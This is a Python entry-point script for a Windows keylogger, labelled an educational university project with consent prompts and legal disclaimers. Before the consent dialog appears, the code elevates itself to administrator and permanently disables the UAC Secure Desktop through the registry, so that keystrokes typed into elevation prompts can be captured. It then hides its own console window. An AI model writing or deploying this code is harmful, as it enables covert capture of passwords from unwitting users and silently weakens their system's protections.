#!/usr/bin/env python3
"""
Educational Keyboard Input Logger — Entry Point
================================================

University Cybersecurity Course Project

This application captures keyboard input events on the LOCAL system for
educational, defensive, and cybersecurity research purposes.  It is
designed to operate **only** with the user's explicit knowledge and
consent and should be tested exclusively in a controlled laboratory
environment.

Features:
    • Captures every key press with a precise timestamp.
    • Writes logs as human-readable plain-text (.txt) files.
    • Automatically rotates to a new log file every 30 minutes.
    • Preserves all previous log files (no overwriting).
    • Requires explicit user consent before starting.
    • Console window auto-hides after consent; press Ctrl+H to
      toggle visibility.

Usage:
    python main.py

Press Ctrl+C at any time to stop the logger gracefully.
Press Ctrl+H at any time to show/hide the console window.

DISCLAIMER:
    Unauthorized use of keylogging software is ILLEGAL in most
    jurisdictions.  The authors assume NO liability for misuse.
"""

import os
import sys
import time
import ctypes
import tkinter as tk
from tkinter import messagebox

from keylogger.config import CONSENT_BANNER, CONSENT_KEYWORD
from keylogger.file_manager import LogFileManager
from keylogger.logger import KeyboardLogger
from keylogger.window_manager import ConsoleWindowManager


# ======================================================================
# Privilege & Secure Desktop Helpers
# ======================================================================

def is_admin() -> bool:
    """Check if the current process is running with Administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def request_admin() -> None:
    """Re-launch this script/exe with Administrator privileges via UAC.

    If the user declines the UAC prompt, the application exits.
    This function does NOT return — it either re-launches or exits.
    """
    if is_admin():
        return  # Already elevated; nothing to do.

    try:
        # Determine the executable path.
        if getattr(sys, "frozen", False):
            # PyInstaller .exe
            exe = sys.executable
            params = ""
        else:
            # Running as plain Python script
            exe = sys.executable  # python.exe
            params = f'"{os.path.abspath(__file__)}"'

        # ShellExecuteW with "runas" triggers a UAC elevation prompt.
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe, params, None, 1
        )

        # ShellExecuteW returns > 32 on success.
        if ret <= 32:
            show_error(
                "Educational Keylogger",
                "Administrator privileges are required.\n\n"
                "Please right-click the application and\n"
                "select 'Run as administrator'."
            )

        # Exit this (non-elevated) instance regardless.
        sys.exit(0)

    except Exception as exc:
        show_error(
            "Educational Keylogger",
            f"Failed to request admin privileges:\n\n{exc}"
        )
        sys.exit(1)


def disable_secure_desktop() -> None:
    """Disable the UAC Secure Desktop so that UAC prompts appear on the
    normal user desktop (where pynput keyboard hooks can capture input).

    Modifies the registry key:
        HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System
        PromptOnSecureDesktop = 0

    This change persists across reboots and only needs to run once.
    Requires Administrator privileges.
    """
    import winreg

    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    value_name = "PromptOnSecureDesktop"

    try:
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ
        ) as key:
            current_value, _ = winreg.QueryValueEx(key, value_name)

        if current_value == 0:
            safe_print("[INFO] Secure Desktop is already disabled.")
            return  # Already disabled; nothing to do.

    except FileNotFoundError:
        pass  # Key doesn't exist yet; we'll create it.
    except Exception:
        pass

    try:
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            key_path,
            0,
            winreg.KEY_SET_VALUE,
        ) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)

        safe_print("[INFO] Secure Desktop disabled — UAC prompts will now "
                   "appear on the normal desktop.")

    except PermissionError:
        safe_print("[WARNING] Could not disable Secure Desktop — "
                   "insufficient permissions.")
    except Exception as exc:
        safe_print(f"[WARNING] Could not disable Secure Desktop: {exc}")


def safe_print(msg: str) -> None:
    """Print to console only if sys.stdout is available (no-console builds)."""
    try:
        print(msg)
    except Exception:
        pass


def get_user_consent() -> bool:
    """Display a GUI consent dialog and return True if the user agrees.

    Uses tkinter so it works in both console and --noconsole (no sys.stdin)
    PyInstaller builds.

    Returns:
        bool: ``True`` if the user clicked Yes/Agree, ``False`` otherwise.
    """
    root = tk.Tk()
    root.withdraw()  # Hide the blank root window

    # Build a readable message from the consent banner
    message = (
        "EDUCATIONAL KEYLOGGER — CONSENT REQUIRED\n"
        "─────────────────────────────────────────\n\n"
        "This tool is part of a University Cybersecurity Course Project.\n\n"
        "It will:\n"
        "  • Capture every key press with a timestamp\n"
        "  • Write logs to a local 'logs/' folder\n"
        "  • Rotate log files every 30 minutes\n\n"
        "⚠  Unauthorized use of keylogging software is ILLEGAL.\n"
        "    Use only on YOUR OWN system in a controlled environment.\n\n"
        "Do you understand and consent to proceed?"
    )

    result = messagebox.askyesno(
        title="Educational Keylogger — Consent",
        message=message,
        icon=messagebox.WARNING
    )

    root.destroy()
    return result


def show_info(title: str, message: str) -> None:
    """Show a simple informational GUI popup."""
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo(title=title, message=message)
    root.destroy()


def show_error(title: str, message: str) -> None:
    """Show a GUI error popup."""
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(title=title, message=message)
    root.destroy()


def main() -> None:
    """Application entry point.

    Workflow:
        0. Ensure we are running as Administrator (auto-elevate if not).
        0b. Disable the UAC Secure Desktop (registry tweak).
        1. Display the consent dialog and obtain explicit permission.
        2. Initialize the window manager and auto-hide the console.
        3. Initialize the file manager (creates ``logs/`` directory).
        4. Start the keyboard listener.
        5. Wait for Ctrl+C, then shut down cleanly.
    """
    # ── Step 0: Ensure Administrator privileges ───────────────────────
    # Required so pynput can hook keystrokes across all desktops and
    # so we can modify the Secure Desktop registry key.
    request_admin()  # No-op if already elevated; re-launches via UAC otherwise.

    # ── Step 0b: Disable the Secure Desktop ───────────────────────────
    # Makes UAC prompts appear on the normal desktop where pynput can
    # capture them.  Only needs to succeed once (persists across reboots).
    disable_secure_desktop()

    # ── Step 1: Obtain consent ────────────────────────────────────────
    if not get_user_consent():
        show_info(
            "Educational Keylogger",
            "Consent not granted.\nNo data has been captured.\n\nGoodbye."
        )
        safe_print("[INFO] Consent not granted.  No data has been captured.  Goodbye.")
        sys.exit(0)

    safe_print("\n[INFO] Consent granted.  Initializing logger...")

    # ── Step 2: Initialize window manager and auto-hide ───────────────
    window_manager = ConsoleWindowManager()

    if window_manager.is_supported:
        safe_print("[INFO] Console will hide in 2 seconds.  Press Ctrl+H to show it again.\n")
        time.sleep(2)
        window_manager.hide()
    else:
        safe_print("[INFO] Console hiding is not supported on this platform.\n")

    # ── Step 3–4: Initialize and start ────────────────────────────────
    file_manager = None
    logger = None

    try:
        file_manager = LogFileManager()
        logger = KeyboardLogger(file_manager, window_manager)
        logger.start()

        # Block the main thread until the user interrupts.
        logger._listener.join()

    except KeyboardInterrupt:
        safe_print("\n\n[INFO] Ctrl+C detected — shutting down gracefully...")

    except Exception as exc:
        safe_print(f"\n[ERROR] An unexpected error occurred: {exc}")
        show_error("Educational Keylogger — Error", f"An unexpected error occurred:\n\n{exc}")
        sys.exit(1)

    finally:
        # ── Step 5: Clean shutdown ────────────────────────────────────
        if logger is not None:
            logger.stop()
        elif file_manager is not None:
            file_manager.close()

    safe_print("[INFO] Application terminated successfully.")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        # ── Last-resort crash handler ─────────────────────────────────
        # In a --noconsole PyInstaller build, unhandled exceptions vanish
        # silently. Write them to a file AND show a popup so the user
        # always gets feedback.
        import traceback
        from keylogger.config import _BASE_DIR

        crash_log = os.path.join(_BASE_DIR, "error_log.txt")
        try:
            with open(crash_log, "a", encoding="utf-8") as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"  Crash at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"{'='*60}\n")
                traceback.print_exc(file=f)
        except Exception:
            pass

        try:
            show_error(
                "Educational Keylogger — Fatal Error",
                f"The application crashed:\n\n{exc}\n\nDetails saved to:\n{crash_log}"
            )
        except Exception:
            pass